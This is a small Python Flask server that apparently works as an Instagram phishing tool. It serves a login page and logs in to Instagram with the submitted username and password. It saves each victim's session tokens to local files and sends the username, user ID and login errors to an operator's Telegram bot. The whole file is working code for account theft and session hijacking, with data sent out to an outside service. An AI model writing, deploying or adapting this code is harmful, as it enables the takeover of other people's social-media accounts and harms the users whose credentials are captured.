from flask import Flask, request, jsonify, render_template
from instagrapi import Client
import json
import os
import requests
import time

app = Flask(__name__)

# Your Telegram bot token and chat ID
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Get from @BotFather
CHAT_ID = "YOUR_CHAT_ID_HERE"  # Get from @userinfobot

@app.route('/')
def serve_login():
    return render_template('login.html')

@app.route('/api/login', methods=['POST'])
def handle_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({"error": "Username and password required"}), 400
    
    try:
        cl = Client()
        cl.login(username, password)
        
        os.makedirs("sessions", exist_ok=True)
        with open(f"sessions/{username}.json", 'w') as f:
            json.dump(cl.get_settings(), f)
        
        send_telegram_notification(f"✅ New Instagram Login!\nUsername: {username}\nUser ID: {cl.user_id}")
        
        return jsonify({
            "success": True, 
            "message": "Login successful! Check Telegram.",
            "user_id": cl.user_id
        }), 200
        
    except Exception as e:
        error_msg = str(e)
        send_telegram_notification(f"❌ Failed Login Attempt\nUsername: {username}\nError: {error_msg}")
        return jsonify({"error": error_msg}), 401

def send_telegram_notification(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message}
        requests.post(url, json=payload, timeout=5)
    except:
        pass

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)